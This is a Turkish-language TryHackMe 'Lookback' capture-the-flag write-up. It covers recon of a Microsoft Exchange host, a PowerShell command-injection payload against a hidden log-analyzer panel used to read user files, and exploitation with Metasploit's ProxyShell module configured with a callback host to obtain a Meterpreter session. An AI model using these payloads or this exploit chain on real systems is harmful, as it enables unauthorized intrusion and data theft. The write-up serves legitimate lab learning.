# TryHackMe - Lookback Writeup

<img width="256" height="256" alt="lookback" src="https://github.com/user-attachments/assets/f93ff91d-9e38-4732-864f-5b1636e415a4" />

## Giriş

Bu yazıda TryHackMe üzerindeki **Lookback** makinesinin çözümünü paylaşıyorum. Senaryoya göre Lookback şirketi Active Directory entegrasyonuna yeni başlamış ve yaklaşan bir deadline yüzünden sistem entegratörü ortamı aceleye getirerek kurmuş. Bizden istenen, production ortamında bir vulnerability test çalıştırıp açıkları tespit etmek.

Makine ICMP'ye cevap vermiyor, o yüzden nmap taramalarında `-Pn` kullanmayı unutmuyoruz.

---

## Keşif

İlk iş olarak klasik bir tam port taraması attım:

```
nmap -sS -A -p- -Pn 10.112.141.99
```
<img width="1018" height="604" alt="nmap" src="https://github.com/user-attachments/assets/cd822af1-eed6-48b7-a862-97685f9017c4" />

SSL sertifikasının Subject Alternative Name kısmında `WIN-12OUO7A66M7.thm.local` diye bir domain adı geçiyordu. Bunu doğrudan `/etc/hosts` dosyama ekledim, çünkü IIS gibi sunucular çoğu zaman hostname'e göre farklı içerik döndürebiliyor (virtual host routing):

```
echo "10.112.141.99 WIN-12OUO7A66M7.thm.local" >> /etc/hosts
```

443 portuna tarayıcıdan gittiğimde beni doğrudan bir Outlook Web Access (OWA) login sayfasına yönlendirdi:

```
https://10.112.141.99/owa/auth/logon.aspx?url=https%3a%2f%2f10.112.141.99%2fowa%2f&reason=0
```
<img width="1212" height="606" alt="loginsayfa" src="https://github.com/user-attachments/assets/f42ffaa3-40a3-46a7-a6c4-c3c0f6ccbcc1" />

Bu da bana ortamda **Microsoft Exchange** olduğunu gösterdi — nmap çıktısındaki sertifika bilgileriyle de örtüşüyordu.

### Dizin taraması

Standart bir ffuf taraması denedim ama sonuç alamadım:

```
ffuf -u http://10.112.141.99/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,301,302
```

Boş dönünce nikto ve whatweb ile devam ettim.

```
nikto -h 10.112.141.99
whatweb 10.112.141.99
```
<img width="1057" height="312" alt="nikto" src="https://github.com/user-attachments/assets/da4adf75-16d1-4a8e-9d90-9276ed08f7b3" />

<img width="1093" height="195" alt="whatweb" src="https://github.com/user-attachments/assets/76da05f4-5a09-4275-913b-1889a8f414c7" />

Nikto çıktısında işime yarayan iki şey vardı:

```
+ /Autodiscover/Autodiscover.xml: Retrieved x-powered-by header: ASP.NET.
+ /Autodiscover/Autodiscover.xml: Uncommon header 'x-feserver' found, with contents: WIN-12OUO7A66M7.
+ /Rpc: Uncommon header 'request-id' found, with contents: 3de2ee56-9a8f-444b-a570-567349d105b8.
+ /Rpc: Default account found for '' at (ID 'admin', PW 'admin'). Generic account discovered.
```

`/Autodiscover` ve `/Rpc` yolları da Exchange varlığını doğruluyordu. Nikto ayrıca `/Rpc` altında `admin:admin` gibi bir default hesap olduğunu iddia etti; bunu OWA login'inde denedim ama sonuç 403 döndü, bu yolda ilerleyemedim.

whatweb çıktısı da OWA sayfasını ve ASP.NET'i teyit etti:

```
https://10.112.141.99/owa/auth/logon.aspx?... [200 OK] ... Outlook-Web-App ...
```

---

## Gizli bir arayüz buluyorum

OWA tarafında bir şey bulamayınca, hostname üzerinde biraz gezinmeye karar verdim. `https://win-12ouo7a66m7.thm.local/` adresine `/test` yolunu ekleyip denedim (admin::admin) ve karşıma yine panel çıktı:

<img width="498" height="297" alt="adminadmin" src="https://github.com/user-attachments/assets/b375d031-70ac-4947-a698-940b9ab3f8a5" />

<img width="696" height="328" alt="test" src="https://github.com/user-attachments/assets/65321ff5-8b55-4a48-b16e-c4efd879a8b6" />


```
THM{Security_Through_Obscurity_Is_Not_A_Defense}
```

**İlk flag burada geldi.** Panelin adı **LOG ANALYZER**'dı ve içinde bir `Path` parametresi vardı. Bu parametre `BitlockerActiveMonitoringLogs` isimli bir log dosyasının yolunu tutuyor ve muhtemelen içeriği `Get-Content` ile PowerShell tarafında okutuluyordu.

---

## Command Injection ile RCE

Panelin `Path` parametresini incelerken, girdinin sanitize edilmeden doğrudan bir PowerShell komutuna (`Get-Content`) enjekte edildiğini fark ettim. Yani klasik bir **komut enjeksiyonu** açığıyla karşı karşıyaydım.

Amacım, uygulamanın kurduğu orijinal `Get-Content` komutundan "kaçıp" kendi komutumu çalıştırmaktı. Kullandığım payload şuydu:

```
'); dir #
```

Bunu path parametresine ekleyip (`BitlockerActiveMonitoringLogs'); dir #`) denedim ve çalıştı — dizin içeriğini listeleyebildim. `pwd` ile baktığımda `C:\Windows\System32\inetsrv` altında çalıştığımı gördüm.

Buradan sonra hedefim Desktop altındaki `user.txt` dosyasıydı:

```
BitlockerActiveMonitoringLogs'); type c:\users\dev\desktop\user.txt #
```
<img width="938" height="387" alt="desktopiçi" src="https://github.com/user-attachments/assets/542408aa-fffe-410b-9b76-7509204bd48b" />

<img width="960" height="282" alt="usertxt" src="https://github.com/user-attachments/assets/eed02d73-20ef-4eeb-9f41-0998d4dea01b" />

```
THM{Stop_Reading_Start_Doing}
```

**İkinci flag de cebimde.**

Desktop'ı `dir` ile listelediğimde bir `TODO.txt` dosyası daha gördüm, onu da okudum:

```
BitlockerActiveMonitoringLogs'); type c:\users\dev\desktop\TODO.txt #
```
<img width="937" height="524" alt="TODOtxt" src="https://github.com/user-attachments/assets/05f73f2b-2525-415d-9884-cb8058607366" />

Bu not aslında yol haritamı çizdi. İki şey öne çıkıyordu:

1. **Exchange kurulu ama güvenlik güncellemesi yapılmamış** ("Install the Security Update for MS Exchange [TO BE DONE]")
2. Kullanabileceğim bir e-posta adresi: `dev-infrastracture-team@thm.local`

ProxyShell olabileceğini düşünmemin birkaç sebebi vardı:

* Recon'da zaten Exchange'in OWA, Autodiscover ve RPC endpoint'lerini görmüştüm — yani hedefte çalışan bir Exchange Server vardı, bu kesindi.
* SSL sertifikasının tarihi Ocak 2023'ü gösteriyordu, yani ortam nispeten eski bir Exchange sürümüyle kurulmuştu. TODO notundaki "Security Update [TO BE DONE]" satırı da bunu doğruluyordu — yani sunucu yamalanmamış durumdaydı.
* Exchange'in yakın tarihli, unauthenticated (kimlik doğrulama gerektirmeyen) ve tam RCE'ye çıkan en bilinen açığı ProxyShell (CVE-2021-34473 / 34523 / 31207). Bu kadar "ünlü" ve etkisi büyük bir zafiyet olduğu için, eski/yamalanmamış bir Exchange gördüğümde ilk aklıma gelen ihtimal bu oldu.
* Ayrıca makinenin adı bile "Lookback" — yani "geriye bak, eski bir açığı hatırla" göndermesi gibi düşünüp bu yönde ilerledim.

---

## ProxyShell ile RCE (CVE-2021-34473)

Metasploit'te hazır modülü aradım:

```
msf > search proxyshell
```

```
0  exploit/windows/http/exchange_proxyshell_rce  2021-04-06  excellent  Yes  Microsoft Exchange ProxyShell RCE
```
<img width="977" height="308" alt="use0" src="https://github.com/user-attachments/assets/14e77527-0786-4b36-b55d-4434a0cddd4f" />

Modülü seçip gerekli ayarları yaptım:

```
use exploit/windows/http/exchange_proxyshell_rce
set RHOSTS 10.112.141.99
set RPORT 443
set VHOST WIN-12OUO7A66M7.thm.local
set SSL true
set LHOST 192.168.134.19
set LPORT 4444
```

`check` komutuyla önce hedefin gerçekten savunmasız olup olmadığını doğruladım:

```
[+] 10.112.141.99:443 - The target is vulnerable.
```

İlk `run` denemesinde exploit, yönetim rolüne sahip bir kullanıcı bulamadığı için başarısız oldu:

```
[*] Enumerated 0 email addresses
[-] Exploit aborted due to failure: no-access: No user with the necessary management role was identified
```

Burada aklıma TODO.txt'de gördüğüm e-posta adresi geldi. `EMAIL` parametresine onu verdim:

```
set EMAIL dev-infrastracture-team@thm.local
```

Tekrar `check` ve `run`:

<img width="1131" height="746" alt="set1" src="https://github.com/user-attachments/assets/4c68b15f-f458-4231-bd1f-ede3504219eb" />

<img width="1058" height="264" alt="set2" src="https://github.com/user-attachments/assets/656dd24a-b6ff-4f86-9d33-61d805e279ac" />

<img width="873" height="540" alt="set3shell" src="https://github.com/user-attachments/assets/e731eac3-a05d-4cdd-aa89-574197f19b45" />


Bu sefer çalıştı ve bir **Meterpreter oturumu** açtım. Exploit arka planda kendi webshell'ini ve mail export request'ini de temizledi.

---

## Son Flag

Oturumu aldıktan sonra Administrator kullanıcısının klasörlerine baktım:

```
meterpreter > cd Desktop
meterpreter > ls
```

Desktop'ta işe yarar bir şey yoktu, `Documents` klasörüne geçtim:

```
meterpreter > cd ..
meterpreter > cd Documents
meterpreter > ls
```

```
100666/rw-rw-rw-  35  fil  2023-02-12 14:57:18 -0500  flag.txt
```

```
meterpreter > cat flag.txt
THM{Looking_Back_Is_Not_Always_Bad}
```

<img width="634" height="449" alt="flagson" src="https://github.com/user-attachments/assets/9ff646ab-2f4f-489b-aaa0-31791fdf7622" />
